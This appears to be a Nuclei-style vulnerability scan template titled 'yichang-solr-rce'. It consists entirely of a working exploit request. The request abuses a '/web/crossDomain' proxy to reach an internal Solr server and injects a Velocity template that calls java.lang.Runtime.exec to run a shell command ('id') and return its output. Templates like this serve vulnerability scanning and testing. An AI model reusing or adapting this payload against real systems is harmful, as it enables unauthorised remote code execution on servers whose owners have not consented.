id: yichang-solr-rce
info:
  name: yichang-solr-rce
  author: test
  severity: high

http:
  - raw:
      - |
        POST /web/crossDomain/?url=http://127.0.0.1:8983/solr/fileindex/select HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: lang=zh-CN; cookietest=1
        Connection: keep-alive
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryo0n35xDY5HBjiYBN
        Content-Length: 764

        ------WebKitFormBoundaryo0n35xDY5HBjiYBN
        Content-Disposition: form-data; name="q"

        1
        ------WebKitFormBoundaryo0n35xDY5HBjiYBN
        Content-Disposition: form-data; name="wt"

        velocity
        ------WebKitFormBoundaryo0n35xDY5HBjiYBN
        Content-Disposition: form-data; name="v.template"

        custom
        ------WebKitFormBoundaryo0n35xDY5HBjiYBN
        Content-Disposition: form-data; name="v.template.custom"

        #set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
        ------WebKitFormBoundaryo0n35xDY5HBjiYBN--

    matchers:
      - type: dsl
        dsl:
          - contains_all(body_1,"uid")